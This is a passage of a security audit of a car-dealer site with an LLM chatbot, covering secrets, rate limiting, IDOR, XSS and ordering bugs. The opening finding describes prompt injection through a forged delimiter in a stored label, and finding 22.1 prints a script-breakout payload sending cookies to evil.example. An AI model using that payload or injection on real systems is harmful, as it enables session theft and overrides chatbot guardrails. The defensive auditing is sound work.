**What it is —** The public, unauthenticated journey beacon (POST /api/journey → handleJourneyBeacon) accepts a client-supplied `label` field, applies ONLY a length cap (cfg.maxLabelLength = 80, src/chatbot/journey.ts:134-136 and recordJourneyEvent at :59), and persists it verbatim to D1. On the next chat turn that stored label is read back by resolveJourney and rendered into the LLM's SYSTEM message: renderEvent wraps it as `searched "<label>"` / `viewed "<label>"` (src/chatbot/grounding/journey.ts:26-29) with only stripPrices() applied (:18-20) — newlines and the block delimiters are NOT neutralised. buildGroundedSystemPrompt folds this into the system prompt's VISITOR JOURNEY section (grounding/index.ts:88-94, system-prompt.ts:115-119 & :297), and core.ts:731 calls it on every AI-reply turn keyed by the caller's own visitor_id cookie. Because the label can carry newlines plus a forged `=== END VISITOR JOURNEY ===` terminator and fake high-authority sections, an attacker can break out of the delimited "context only" wrapper and inject instruction-like text directly into the model's system role — defeating the anti-hallucination/guardrail framing the prompt is built around (e.g. coaxing invented prices, fake commitments/warranties, or dumping the system prompt/knowledge base). Blast radius is limited: journey rows are keyed to the attacker's own opaque UUID cookie, so it is self-session (cross-user needs a victim's HttpOnly random id), and private fields (dealerNotes) are excluded from chat grounding, so no server-secret exfiltration — hence low severity, but it is a genuine untrusted-input-to-model-instructions vector.

**Evidence —** src/chatbot/journey.ts:134-136 accepts `body.label` (client JSON) and stores it length-capped only; recordJourneyEvent src/chatbot/journey.ts:59 caps to maxLabelLength (80) with no content sanitisation; src/chatbot/grounding/journey.ts:26-29 renders `searched "${label}"` after only stripPrices() (:18-20); src/chatbot/system-prompt.ts:297 concatenates the journey section into the system prompt; src/chatbot/core.ts:731-738 builds the grounded system message per turn. resolveVisitor (src/chatbot/visitor.ts:77-78) trusts any client-supplied cookie value as the visitor id.

**Suggested fix —** Neutralise the label before it enters model instructions: strip newlines/control chars and any `=== ... ===` delimiter-looking tokens (or collapse to a single line and hard-truncate) in renderEvent/recordJourneyEvent, and/or fence the interpolated value so it cannot forge the block terminator. Broadly, treat all grounding-block free text as data (escape delimiter sequences) rather than relying on prose framing alone.

---

## 19. Secrets & env exposure

**Audit summary.** Hunted secrets/env exposure across the whole codebase (excluding labs/experience per scope). GOOD NEWS on the high-risk checks: (1) .env / .dev.vars / .env.production are properly gitignored and were never committed to git history (only .env.example is tracked, with empty values); (2) NO secret value reaches the browser bundle — I scanned dist/client/* for every true secret's literal value and found none (the only client-side hits were the PUBLIC Turnstile SITE key and the brand string "Rebirth Auto", both non-secret false positives); (3) the SANITY_TOKEN is a READ token used only server-side (generate-description/capture), never sent client-side; (4) API error responses all return static generic strings — no error object/stack/secret is echoed; (5) the two console.error calls that mention secrets log only the variable NAME, not the value. The one real issue found: the `env.X ?? import.meta.env.X` fallback pattern used for server secrets causes Vite to statically inline plaintext secret VALUES into the built Worker bundle (dist/server), and the adapter copies the full plaintext .dev.vars into dist/server as well. Client-facing surface is clean; the exposure is confined to the server build artifact.

**Findings: 2**

### 19.1  [MEDIUM] Server secrets are statically inlined into the built Worker bundle via import.meta.env fallbacks
**Category:** secrets-env-exposure · **Location:** `src/chatbot/get-env.ts:22`

**What it is —** Every server-secret reader uses the pattern `env.X ?? import.meta.env.X` (get-env.ts:22 OPENROUTER, :29/:31/:33 Telegram bot token/chat/webhook secret, :37 Turnstile secret; src/lib/capture/env.ts:37-40 OPENROUTER/SANITY_TOKEN/NEVDIS; src/lib/generate-description/env.ts:27-28 OPENROUTER/SANITY_TOKEN; src/pages/api/saved-search.ts:54 & book-service.ts:55 RESEND_API_KEY; src/pages/api/trade-in.ts:49 REDBOOK; src/pages/api/carsales-upload.ts:57 CARSALES; src/actions/index.ts:32 TURNSTILE_SECRET_KEY). Because `import.meta.env.<NAME>` is a Vite-static expression, when the referenced var is present at BUILD time Vite replaces it with the literal string, baking the plaintext secret into the emitted server chunks. This is exactly what happened in the local production build: dist/server/chunks/get-env_CJlpN6De.mjs contains `OPENROUTER_API_KEY: e.OPENROUTER_API_KEY ?? "<the real key>"`, and the 180-char SANITY_TOKEN value is inlined into dist/server/chunks/http_zb72aT66.mjs and generate-description_CFp_MOBK.mjs. The dist/server tree IS the Cloudflare Worker code that gets uploaded on deploy. If any of these secrets are present as build-time env during the Cloudflare build (or in any locally-built artifact), the deployed Worker script carries deploy-capable plaintext credentials in its source — defeating the whole point of `wrangler secret put` (which keeps secrets encrypted and out of the code) and exposing them to anyone with Worker source/read access or via shipped source maps. The correct pattern for a Cloudflare Worker is to read ONLY from the runtime `env` binding (`import { env } from 'cloudflare:workers'`) with no import.meta.env fallback for true secrets; keep import.meta.env only for genuinely PUBLIC_ vars.

**Evidence —** src/chatbot/get-env.ts:22 `(e.OPENROUTER_API_KEY as string | undefined) ?? import.meta.env.OPENROUTER_API_KEY`; verified inlined in build output: dist/server/chunks/get-env_CJlpN6De.mjs -> `OPENROUTER_API_KEY: e.OPENROUTER_API_KEY ?? "<KEY>"`; SANITY_TOKEN literal (180 chars) present in dist/server/chunks/http_zb72aT66.mjs and generate-description_CFp_MOBK.mjs (grep -lF of the .env value matched). Confirmed these are dist/server (Worker) chunks, and NOT present in any dist/client file.

**Suggested fix —** Drop the `?? import.meta.env.<SECRET>` fallback for all non-PUBLIC secrets in get-env.ts, capture/env.ts, generate-description/env.ts, saved-search.ts, book-service.ts, trade-in.ts, carsales-upload.ts, actions/index.ts — read secrets solely from the cloudflare:workers runtime `env`. For local Node/non-CF runs use a runtime `process.env` lookup (not the Vite-static import.meta.env) so nothing is inlined at build. Reserve import.meta.env for PUBLIC_* vars only.

### 19.2  [LOW] Plaintext .dev.vars (full secret set) copied verbatim into the build output dist/server/
**Category:** secrets-env-exposure · **Location:** `.dev.vars`

**What it is —** The @astrojs/cloudflare build copies the local `.dev.vars` file wholesale into `dist/server/.dev.vars`. That copied file contains the full plaintext secret set — OPENROUTER_API_KEY, TELEGRAM_BOT_TOKEN, TELEGRAM_WEBHOOK_SECRET, TURNSTILE_RB_LISTINGS_AUTO_SECRET_KEY, SANITY_TOKEN, TURNSTILE_SECRET_KEY (verified: grep -lF of each .env secret value matched dist/server/.dev.vars). Impact is limited because dist/ is gitignored (so it is not committed) and `wrangler deploy` does not upload `.dev.vars` to the Worker (it is a local-dev-only file), so it does not reach production or the browser. The residual risk is a plaintext credential file sitting in the build directory: it leaks if the dist artifact is shared, archived, uploaded to CI artifact storage, or copied into a container image. Treat as build-hygiene, not a live client-facing exposure.

**Evidence —** dist/server/.dev.vars exists (1206 bytes) and contains the real secret values (verified by matching every non-PUBLIC .env value against it). Root .dev.vars is correctly gitignored (.gitignore line: `.dev.vars`) and dist is gitignored (`git check-ignore dist` -> dist). No secret value from .dev.vars appears anywhere under dist/client/.

**Suggested fix —** Ensure CI/deploy never publishes or caches the dist/server/.dev.vars artifact; optionally add a post-build step to delete dist/server/.dev.vars, and confirm .dev.vars is absent from any container/image build context. No source-code change required.

---

## 20. Rate-limiting & cost abuse

**Audit summary.** Traced every POST/API/action entry point to its sink. The eight feature endpoints (chat, search, saved-search, book-service, trade-in, generate-description, carsales-upload, compare-pick) and the three capture endpoints all call checkRateLimit/checkLimit with DISTINCT key prefixes — no prefix collisions found, IP is read from the unspoofable CF-Connecting-IP header, and rateLimit config blocks are present (no silent fail-open). Auth actions rely on single-use Turnstile tokens + Supabase limits, which is acceptable. TWO endpoints that hit D1 have NO limiter at all: /api/journey (unbounded INSERTs) and /api/chat-poll (unbounded reads). One info-level observation: the public AI-search endpoint has no Turnstile, so LLM cost is bounded only by a per-IP 30/hr counter (defeated by IP rotation). Checklist: rate-limit coverage FAIL (2 endpoints uncovered); prefix-collision check PASS; Turnstile coverage PARTIAL.

**Findings: 3**

### 20.1  [MEDIUM] /api/journey has no rate limit — unbounded D1 writes (cost/storage abuse)
**Category:** rate-limiting · **Location:** `src/pages/api/journey.ts:17`

**What it is —** The journey beacon endpoint is a POST route that performs a D1 INSERT into journey_events on every call, but has NO checkRateLimit, NO Turnstile, and NO origin allowlist — it is the only D1-writing POST endpoint in the codebase without a limiter (contrast saved-search 'savedsearch:', book-service 'service:', trade-in 'tradein:', chat 'rl:'). handleJourneyBeacon() resolves the visitor via resolveVisitor (minting a fresh cookie when none is presented) and calls recordJourneyEvent(), which runs `INSERT INTO journey_events (...)`. An attacker scripting the endpoint while ignoring the Set-Cookie response gets a brand-new visitor_id per request, so every POST writes a new row. At even a few hundred req/s this is unbounded row growth in journey_events plus per-write D1 billing and write-throughput exhaustion — a cheap DoS/cost vector. The endpoint's own 'always return 204, fail-open' contract makes it silent: nothing throttles, logs a 429, or ever pushes back. Row size is capped (ref 512B, label maxLabelLength) but row COUNT is not.

**Evidence —** src/pages/api/journey.ts:17 `export const POST` calls handleJourneyBeacon with no guard; src/chatbot/journey.ts:139 the beacon calls `recordJourneyEvent(env.CHAT_DB, visitorId, kind, ref, label)`; src/chatbot/journey.ts:60-66 executes `INSERT INTO journey_events (...) VALUES (?, ?, ?, ?, ?)`. grep for checkRateLimit/checkLimit shows zero hits in journey.ts or handleJourneyBeacon, unlike every other write endpoint.

**Suggested fix —** Add a per-IP checkRateLimit(env.RATE_LIMIT_KV, ip, dealerConfig.chat.journey.rateLimit, 'journey:') at the top of handleJourneyBeacon before recordJourneyEvent, returning a 204 (silently drop) when over budget so the fail-open UX contract is preserved. Add a journey.rateLimit block to dealerConfig. A generous window (e.g. 60/hr) still bounds abusive floods.

### 20.2  [LOW] /api/chat-poll has no rate limit — unbounded D1 reads on attacker-supplied sessionId
**Category:** rate-limiting · **Location:** `src/pages/api/chat-poll.ts:30`

**What it is —** The chat-poll GET endpoint runs two D1 queries per request (getStatus then getMessagesAfterId) against a fully attacker-controlled `sessionId` URL param, with no checkRateLimit and no throttle of any kind. A client can poll it in a tight loop (or fan out across many fabricated sessionIds) to drive continuous D1 read load and read-billing with no ceiling. Because sessionId is untrusted and there is no ownership check, the same unthrottled surface also allows cheap high-rate enumeration of session ids to read other visitors' chat transcripts — the rate-limit gap is what makes that enumeration practical. The widget is expected to poll only while a session is escalated/human_active, but nothing enforces that server-side.

**Evidence —** src/pages/api/chat-poll.ts:30 `export const GET` reads `sessionId`/`afterId` from the URL and at lines 47-51 calls `getStatus(db, sessionId)` and `getMessagesAfterId(db, sessionId, afterId)` with no limiter; the checkRateLimit grep returns no hits for chat-poll.ts.

**Suggested fix —** Wrap the handler with checkRateLimit(env.RATE_LIMIT_KV, ip, <poll rateLimit>, 'chatpoll:') using a poll-appropriate budget, returning 429 with Retry-After when exceeded; fail-open on KV error to match the other endpoints. Separately consider binding sessionId to the visitor cookie to stop cross-session reads.

### 20.3  [INFO] Public AI-search endpoint has no Turnstile — LLM cost bounded only by per-IP counter
**Category:** cost-abuse · **Location:** `src/pages/api/search.ts:117`

**What it is —** The public natural-language search endpoint routes soft/ambiguous queries to an OpenRouter generateObject call. Its only abuse control is a per-IP checkRateLimit ('search:' prefix, 30 requests/hr) — there is no Turnstile challenge and no origin allowlist (unlike generate-description/carsales-upload which are studio-origin-locked). Per-IP limits are trivially defeated by IP rotation (botnet/proxy pool), so a determined attacker can drive unbounded LLM spend by spreading requests across IPs, each getting its own 30/hr budget. This is a deliberate design tradeoff (comment: 'Shopper search is higher-volume ... still capped per-IP to bound AI cost'), and a free-tier model limits blast radius today, but it is worth flagging before a paid model is restored per the phase-3 memo. The deterministic pre-pass does divert many queries away from the LLM, but any soft phrase reaches it.

**Evidence —** src/pages/api/search.ts:117 `checkRateLimit(env.RATE_LIMIT_KV, ip, cfg.rateLimit, 'search:')` is the sole guard; grep for Turnstile/Origin in search.ts returns nothing; config src/config/dealer.ts:825 `rateLimit: { windowSeconds: 3600, maxRequests: 30 }`; the LLM sink is generateObject at src/pages/api/search.ts:~176.

**Suggested fix —** Before restoring a paid structured model, consider a Turnstile challenge on the first search per session (mirroring the chatbot's new-visitor gate in core.ts) or a global/day-level spend cap, since per-IP limits alone do not stop IP-rotation cost abuse.

---

## 21. Data leakage, privacy & IDOR

**Audit summary.** Swept the whole codebase for this class. dealerNotes/registrationPlate/stockNumber are correctly excluded from LISTING_FIELDS and from EVERY grounding/compare/tools projection (all explicit public field lists) — no public dealerNotes leak found. The by-email account reads are scoped to the authenticated user's own email, and the only other D1 read surface (chat-poll) is gated by an unguessable crypto.randomUUID session id, and the by-visitor_id read helpers (getSavedSearches/getBookings) are never wired to any reachable endpoint — so there is no guessable-id IDOR. However, the account surface uses an *unverified* Supabase email as the sole key to another person's PII, and the guest write endpoints accept an arbitrary attacker-supplied email with no ownership proof, which together create a real privacy/IDOR + content-injection risk on the PII surface. Checklist: dealerNotes-never-public = PASS; by-email-authenticated = PARTIAL (no email_confirmed_at guard); guessable-id IDOR = PASS.

**Findings: 3**

### 21.1  [MEDIUM] Account PII (saved searches + service bookings) keyed on an UNVERIFIED Supabase email — cross-user read if email confirmation is off
**Category:** idor · **Location:** `src/pages/account.astro:55`

**What it is —** The /account dashboard reads a user's saved searches and service-booking requests purely by email string: getSavedSearchesByEmail(CHAT_DB, userEmail, 10) and getBookingsByEmail(CHAT_DB, userEmail, 10), where userEmail = user.email (account.astro:35). The service_bookings rows contain real PII — name, phone, vehicle, preferred date and free-text notes (src/lib/service-booking.ts:34-46). Nothing in the code ever checks user.email_confirmed_at / email_verified before trusting user.email as the authorization key — a grep for email_confirmed/confirmed_at/email_verified across src/ returns zero hits. Whether a session is issued for an unconfirmed (i.e. attacker-supplied, unowned) email is delegated entirely to external Supabase project config. If 'Confirm email' is disabled (the signUp handler in src/actions/index.ts:126-137 explicitly supports the auto-confirmed / immediate-session path — 'You are now logged in'), an attacker can sign up with victim@example.com, receive a session with no proof of ownership, and the account page will render every saved search and every service booking ever stored under that email string. The tables have NO user_id column (only email + anonymous visitor_id — confirmed migrations 0004/0005 and the interface shapes), so email is the entire access-control boundary.

**Evidence —** src/pages/account.astro:35 userEmail = user.email; :55-58 getSavedSearchesByEmail/getBookingsByEmail(CHAT_DB, userEmail, 10); read helpers src/lib/service-booking.ts:172-190 and src/lib/saved-search.ts:132-150 do a bare `WHERE lower(email)=lower(?)`. signUp auto-confirm path src/actions/index.ts:126-137. No email_confirmed_at check anywhere (grep confirmed).

**Suggested fix —** Before using user.email as a data key, require user.email_confirmed_at (reject/redirect otherwise) in middleware or the account page. Longer term, key saved_searches/service_bookings on the Supabase user id (add a user_id column + migration) rather than a raw email string, so authorization does not depend on an external 'confirm email' toggle.

### 21.2  [LOW] Guest write endpoints accept an arbitrary email — attacker can inject content into a victim's authenticated /account history
**Category:** data-integrity · **Location:** `src/pages/api/book-service.ts:102`

**What it is —** POST /api/book-service and POST /api/saved-search are unauthenticated and take the `email` straight from the request body with only a syntactic isValidEmail() shape check and no proof the caller owns that address (book-service.ts:102/110, saved-search.ts:98-101). Rows are stored keyed by that email (plus an anonymous visitor_id cookie). Because /account later aggregates and displays ALL rows matching the logged-in email (finding above), an attacker who knows a victim's email can POST a booking or saved search with victim@example.com and attacker-controlled free text (notes up to 1000 chars, label, vehicle) that then appears inside the victim's authenticated account dashboard framed as their own history — a phishing / data-integrity vector (e.g. a fake 'service booking' whose notes tell the victim to call a scam number). It also lets an attacker pre-seed or pollute the account view of any email before/after that person registers. Rendering is via Astro JSX `{b.vehicle}`/`{s.label}` (account.astro:176-213), which auto-escapes, so this is content injection / integrity — not stored XSS.

**Evidence —** src/pages/api/book-service.ts:102 email = b.email; :110 isValidEmail(email) only; :148-157 saveBooking stores it. src/pages/api/saved-search.ts:98-101 same pattern. No auth/session tie to the email; visitor_id is a self-mintable cookie (src/chatbot/visitor.ts:70-90). Displayed on the victim's dashboard: src/pages/account.astro:176 {b.service_type}, :179 {b.vehicle}, :213 {s.label}.

**Suggested fix —** Do not surface guest-submitted rows on an authenticated dashboard as the user's own without verifying ownership. Either require an authenticated session for writes that will appear in /account and take the email from the session (not the body), or clearly segregate/verify guest-submitted rows before joining them into a logged-in user's history.

### 21.3  [INFO] generate-description feeds private dealerNotes to the LLM behind only a forgeable Origin-header check
**Category:** data-leakage · **Location:** `src/pages/api/generate-description.ts:108`

**What it is —** POST /api/generate-description reads the private dealerNotes field server-side and includes it in the LLM prompt as grounding (generate-description.ts:196, facts.dealerNotes). Access is gated ONLY by an Origin-header allowlist (studioOrigins) — the code itself flags this as a stopgap: 'TODO(multi-tenant): replace origin check with Studio session validation before real dealer data flows'. The Origin header is browser-enforced for cross-site fetches, but is trivially forgeable by a non-browser client (curl/server-to-server), so anyone who knows a studioOrigin value and a listingId can invoke it. The response returns only generated Portable Text / selling points (not dealerNotes verbatim), so this is not a direct dump, but dealerNotes content can bleed into the returned prose. Low impact because it is a dealer-facing Studio tool and the response is not the raw private field, but it is the one place private staff notes cross an HTTP boundary with weak auth.

**Evidence —** src/pages/api/generate-description.ts:108-111 Origin-only allowlist with self-acknowledged TODO; :196 dealerNotes: draft.dealerNotes ?? '' passed into the prompt; sanity-draft projection selects dealerNotes (src/lib/generate-description/sanity-draft.ts:53).

**Suggested fix —** Replace the Origin-header check with real Studio session/auth validation before dealerNotes is read, and/or omit dealerNotes from the prompt for any request that cannot prove an authenticated Studio session. Put /studio and its API behind Cloudflare Access (already noted in TODO_KEYS).

---

## 22. XSS, output encoding & headers

**Audit summary.** Found a real stored-XSS class: two compare pages serialize CMS-derived vehicle data into an inline <script> element via Astro's raw `set:html={JSON.stringify(cars)}`. JSON.stringify does not escape `</script>` (nor `<`/`>`/`/`), so any listing make/model/title containing `</script>` breaks out of the script element and injects executable markup that runs for every visitor of that compare page. There is no Content-Security-Policy anywhere (middleware deliberately omits it), so nothing mitigates the breakout. Other reviewed sinks are safe: the chat `format()` and all compare/tray `esc()` paths escape before innerHTML; `iconSvg`/`detailIconName`/`categoryIconName` never interpolate untrusted input (icon name is a fixed map lookup, class arg is always a developer literal); `reset-password` renders only fixed strings from `error_description` (never the raw param); listing descriptions render through astro-portabletext (no raw HTML) and all `{}`/meta interpolation is auto-escaped; the auth middleware redirects are hardcoded ('/login','/account') with no user-controlled `next`/`redirect` param, so no open redirect. Headers set: X-Content-Type-Options, Referrer-Policy, X-Frame-Options=SAMEORIGIN; missing: CSP and Permissions-Policy (documented deferrals).

**Findings: 3**

### 22.1  [HIGH] Stored XSS via </script> breakout: CMS vehicle data raw-injected into inline <script> on /compare
**Category:** xss · **Location:** `src/pages/compare.astro:524`

**What it is —** The Verdict Board embeds the client scoring data with `<script type="application/json" id="vboard-data" is:inline set:html={JSON.stringify(cars)} />`. `set:html` is Astro's raw, un-escaped output sink, and `cars` is built at src/pages/compare.astro:251-260 directly from Sanity CMS fields — `name: [l.make, l.model].filter(Boolean).join(' ') || l.title`. `JSON.stringify` does NOT escape the sequence `</script>` (it leaves `<`, `>` and `/` untouched), and the HTML tokenizer uses the 'script data' state inside ANY script element regardless of `type`. So a vehicle whose make/model/title contains `</script>` closes the script element early and everything after it is parsed as live markup. Realistic exploit: a dealer/CMS author (or any content-injection path feeding make/model/title) sets a listing title to `</script><script>fetch('https://evil.example/'+document.cookie)</script>`; every shopper who opens /compare?ids=<that listing> executes the injected script — session/cookie theft, actions performed as the visitor, defacement. No CSP is present (see middleware finding) so there is zero defense-in-depth.

**Evidence —** src/pages/compare.astro:524 `set:html={JSON.stringify(cars)}` inside `<script type="application/json" is:inline>`; cars source at src/pages/compare.astro:251-260 maps `l.make`/`l.model`/`l.title` (Sanity CMS strings) into the serialized object. JSON.stringify does not escape `</script>`.

**Suggested fix —** Do not use set:html for JSON in a script tag. Either escape the closing-tag sequence after stringifying (e.g. `.replace(/</g,'\\u003c')` on the JSON string) before set:html, or emit the data with Astro's `define:vars` / a `data-*` attribute (auto-escaped) and JSON.parse it client-side, or set `el.textContent` from a same-origin fetch.

### 22.2  [HIGH] Stored XSS via </script> breakout: CMS vehicle data raw-injected into inline <script> on /compare-tools
**Category:** xss · **Location:** `src/pages/compare-tools.astro:326`

**What it is —** Identical sink to the /compare finding. The Balance tool embeds its scoring dataset with `<script type="application/json" id="balance-data" is:inline set:html={JSON.stringify(cars)} />`, and `cars` (src/pages/compare-tools.astro:63-65) is built from CMS `l.make`/`l.model`/`l.title`. Because `set:html` is raw and JSON.stringify does not escape `</script>`, a listing name containing `</script>...` breaks out of the script element and injects executable markup that runs for every visitor loading /compare-tools?ids=<that listing>. Same impact (cookie/session theft, actions as the visitor) and same absence of any CSP mitigation.

**Evidence —** src/pages/compare-tools.astro:326 `set:html={JSON.stringify(cars)}`; cars built at src/pages/compare-tools.astro:63-65 from `l.make`,`l.model`,`l.title` (Sanity CMS).

**Suggested fix —** Same remediation as /compare: escape `<`/`</script>` in the serialized JSON before set:html, or move the data into a define:vars/data-attribute JSON.parse path instead of a raw script-tag body.

### 22.3  [LOW] No Content-Security-Policy header — XSS breakout has zero defense-in-depth
**Category:** security-headers · **Location:** `src/middleware.ts:30`

**What it is —** The site-wide `applySecurityHeaders` sets X-Content-Type-Options=nosniff, Referrer-Policy=strict-origin-when-cross-origin, and X-Frame-Options=SAMEORIGIN, but deliberately sets NO Content-Security-Policy (and no Permissions-Policy). The omission is documented as an intentional follow-up (per-source allow-listing for Turnstile/Supabase/OpenRouter/Sanity is non-trivial), so this is not itself a bug — but it is the reason the two `</script>`-breakout stored-XSS findings above have no mitigating control: injected inline script executes unrestricted. Worth flagging as the gap that turns those breakouts from 'contained' into 'full script execution'. Reported low because it is a documented deferral, not an accidental regression.

**Evidence —** src/middleware.ts:30-35 `applySecurityHeaders` sets only nosniff/Referrer-Policy/X-Frame-Options; comment at src/middleware.ts:16-22 explicitly notes CSP and Permissions-Policy are not set. `grep -rn Content-Security-Policy src/` returns only the comment, no header is ever set.

**Suggested fix —** After fixing the set:html sinks, add at least a baseline CSP (e.g. default-src 'self' with the required allow-list for Turnstile/Supabase/OpenRouter/Sanity and a nonce/strict-dynamic for inline scripts) so a future injection cannot execute inline script.

---

## 23. SSRF & untrusted fetch/upload

**Audit summary.** No SSRF or untrusted fetch/upload vulnerability found in the in-scope code. Traced every untrusted entry point to its sink: (1) Capture photo/audio "uploads" are never actually uploaded or stored — capture/index.astro:215-221 turns each file into an opaque string `photo:name:size`, and capture/extract.ts:50-52 feeds those imageRefs only to a deterministic hash stub (vision-extract.ts) with no network I/O; counts/lengths are bounded (maxImages, maxTranscriptLength). No audio endpoint exists. (2) Grounding web-search enforces its allowlist: fetchAllowlisted() gates every candidate through inAllowlist() host-membership before return, and the live path is stubbed (no real fetch). (3) No real fetch() takes a user-supplied URL — every outbound call targets a hardcoded host: OpenRouter (openrouter.ts:32), Turnstile (actions/index.ts:54), Telegram (telegram.ts:55), or a same-origin internal partial. (4) Sanity image URLs are server-derived: generate-description.ts:250 builds urlFor(ref) from draft.images[].asset._ref read server-side by listingId (not attacker-controllable; urlFor only emits cdn.sanity.io), and visitor chat content is string-typed (state.ts:42) so no image_url part can be injected into the OpenRouter call. All risky integrations (VIN/NEVDIS, vision, carsales, websearch) are stubbed behind the useStub convention with no real HTTP, and dealer/Studio endpoints are origin-allowlisted + rate-limited. Empty findings array — nothing real to report for this class. Checklist status: capture uploads PASS (no storage/fetch), grounding allowlist PASS (enforced), server-side URL fetch PASS (none user-controlled), Sanity image URL construction PASS (server-derived).

**Findings:** none — this area was assessed clean.

---

## 24. Determinism & data integrity

**Audit summary.** Hunted the determinism/data-integrity class across the whole codebase (excluding labs/experience per scope). The runtime stub layer (price-history, redbook, vin-lookup, vision, etc.) is genuinely deterministic and correctly env/flag-gated — no fabricated data leaks there. The real defect class is UNSTABLE GROQ ORDERING: every ordering clause in the codebase sorts on a non-unique field (price / listingDate / year / odometer) with NO secondary `_id` tiebreaker, while the results are then paginated or top-N sliced. GROQ does not guarantee a stable order among tied documents, so slicing an unstable order silently duplicates and drops records. This is worst on the primary inventory browse surface (default sort `newest`), because the importer stamps every vehicle with the same import-time `listingDate`, making the tie set effectively the ENTIRE inventory. Cross-cutting checklist status: Determinism/no-fabricated-data = FAIL (unstable paginated ordering); stub fabrication gating = PASS; fail-open error handling = PASS (matches documented intent). Findings ranked most-severe first.

**Findings: 4**

### 24.1  [HIGH] Inventory pagination orders on a non-unique field with no tiebreaker → listings duplicated across pages and others silently dropped
**Category:** determinism · **Location:** `src/lib/listings-query.ts:252`

**What it is —** buildListingsQuery paginates with `*[${filter}]{...} | order(${order}) [${offset}...${end}]`, where `order` comes from SORT_CLAUSES (lines 79-85): `listingDate desc`, `price asc/desc`, `vehicleSpecs.year desc`, `vehicleSpecs.odometer asc`. None includes a unique secondary key (e.g. `_id asc`). GROQ leaves the relative order of documents that tie on the sort key UNSPECIFIED and not guaranteed stable between two independent fetches. Because the query then takes a positional slice `[offset...end]`, an unstable order means the boundary between page N and page N+1 can shift between the two requests: a vehicle at the page boundary can appear on BOTH pages, and another tied vehicle can appear on NEITHER — it becomes unreachable through browsing. Real impact is amplified by the fact that ties are the common case here, not the edge case: dealer prices cluster on round numbers, and the DEFAULT sort is `newest` (dealer.ts:680) = `listingDate desc`, while the importer stamps EVERY vehicle with the same import-run timestamp (see import-bundaberg.ts:389). So on the default inventory view the entire catalogue is one giant tie set and page-to-page ordering is effectively arbitrary — a shopper paging through inventory (or the SSR partial re-fetch) can be shown the same car twice and never be shown some cars at all. This is a determinism/data-integrity violation on the site's core browse surface.

**Evidence —** src/lib/listings-query.ts:252 `"items": *[${filter}]{ ${LISTING_FIELDS} } | order(${order}) [${offset}...${end}]`; SORT_CLAUSES at src/lib/listings-query.ts:79-85 have no `_id` tiebreaker; default sort `newest` at src/config/dealer.ts:680; every listing stamped `listingDate: new Date().toISOString()` at import (scripts/import-bundaberg.ts:389) → identical listingDate across the whole import = full-catalogue tie under the default sort.

**Suggested fix —** Append a unique, stable secondary sort key to every clause, e.g. `order(listingDate desc, _id asc)`, `order(price asc, _id asc)`, etc., so the total order is deterministic and positional pagination is repeatable. (Also consider giving imported vehicles distinct listingDates, but the tiebreaker is the correctness fix.)

### 24.2  [MEDIUM] Chatbot grounding / inventory tools take `order(price asc)[0...max]` with no tiebreaker → Rebi surfaces a non-deterministic 'cheapest N' set for identical queries
**Category:** determinism · **Location:** `src/ai/tools/inventory-tools.ts:186`

**What it is —** The chatbot's deterministic inventory executor and the two grounding search paths all build `*[${scoped}] | order(price asc) [0...${max}]${projection}` with no secondary key. When several vehicles share the same price (common — e.g. multiple cars at $19,990), the set of documents returned in positions 0..max is not stable: GROQ can return a different subset of the tied cars on repeat runs. The result is that Rebi, asked the same question twice ('show me your cheapest SUVs'), can ground on and cite DIFFERENT actual vehicles each time, and a car that is genuinely among the cheapest can be omitted from the grounded list while a same-priced sibling is shown. The individual records are real (no fabrication), but WHICH real records surface is non-deterministic, which undermines the 'deterministic executors return real stock' guarantee the system relies on for the anti-hallucination firewall. Same defect in the grounding context and lookup builders.

**Evidence —** src/ai/tools/inventory-tools.ts:186, src/chatbot/grounding/context.ts:166, src/chatbot/grounding/lookup.ts:126 — all `... | order(price asc) [0...${max}] ...` with no `_id`/unique tiebreaker.

**Suggested fix —** Add a stable secondary key, e.g. `order(price asc, _id asc) [0...${max}]`, in all three builders so the top-N slice is reproducible.

### 24.3  [LOW] Related-listings query slices `order(listingDate desc)[0...3]` on a field that is identical across all imported vehicles → arbitrary/unstable 'related' picks
**Category:** determinism · **Location:** `src/pages/listings/[slug].astro:53`

**What it is —** The vehicle detail page picks the 3 'related' vehicles with `*[_type == 'listing' && category == $category && slug.current != $slug] | order(listingDate desc)[0...3]`. As with the main grid, `listingDate` is identical across the whole imported catalogue (import-bundaberg.ts:389) and there is no tiebreaker, so the [0...3] slice selects an unspecified 3 of N tied documents — the 'related' block can differ between two loads of the same page and is not derived from any real relatedness signal. Low severity (cosmetic recommendation block, no data loss), but it is the same unstable-ordering root cause and produces non-reproducible output.

**Evidence —** src/pages/listings/[slug].astro:52-54 `... | order(listingDate desc)[0...3]{ ${LISTING_FIELDS} }`; all listings share listingDate per scripts/import-bundaberg.ts:389; no secondary sort key.

**Suggested fix —** Add `_id asc` as a tiebreaker for reproducibility, and consider ordering by an actual relatedness signal (same make/bodyType/price band) rather than listingDate.

### 24.4  [LOW] Importer generates detail array `_key`s with Math.random → non-idempotent writes, duplicated/churned detail rows on re-import
**Category:** determinism · **Location:** `scripts/import-bundaberg.ts:74`

**What it is —** detailKey builds each Sanity `details[]` array `_key` as `${slugify(label)}-${Math.random().toString(36).slice(2,6)}`. Sanity array item `_key`s are the identity used to diff/patch array entries, so a random suffix means the same source vehicle imported twice produces DIFFERENT keys for the same detail row. On a re-import / createOrReplace this makes the write non-idempotent: identical content is treated as new items, defeating clean diffs and risking duplicated or churned detail rows rather than a stable no-op. It also contradicts the file's own stated determinism goals (the neighbouring randKey helper already uses crypto randomUUID, but that is beside the point — the key should be derived from the content, not randomized). Contained to the import script (not shopper runtime), hence low, but it is a determinism defect in a data-write path.

**Evidence —** scripts/import-bundaberg.ts:74 `const detailKey = (label: string) => \`${slugify(label)}-${Math.random().toString(36).slice(2, 8)}\`;` used at line 326 `_key: detailKey(spec.label)`.

**Suggested fix —** Derive the `_key` deterministically from stable content (e.g. slug of label, plus index or a hash of label+value) so re-imports produce identical keys and patch idempotently.

---
